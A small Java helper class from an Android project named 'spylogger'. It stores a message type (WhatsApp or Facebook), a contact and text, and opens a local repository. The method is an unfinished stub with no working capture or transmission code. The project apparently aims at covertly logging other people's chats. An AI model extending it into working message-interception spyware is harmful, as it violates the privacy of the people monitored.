package com.gravatasufoca.spylogger.helpers;

import android.content.Context;

import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;

import java.sql.SQLException;

/**
 * Created by bruno on 04/06/17.
 */

public class MensagemAddHelper {
    private final Context context;
    private Tipo tipo;
    private String contato;
    private String texto;

    public enum Tipo{
        WHATS,FACE;
    }

    public MensagemAddHelper(Context context) {
        this.context = context;
    }

    public void add(Tipo tipo,String contato,String texto){
        this.tipo = tipo;
        this.contato = contato;
        this.texto = texto;

        try {
            RepositorioTopico repositorioTopico=new RepositorioTopicoImpl(context);

        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

}
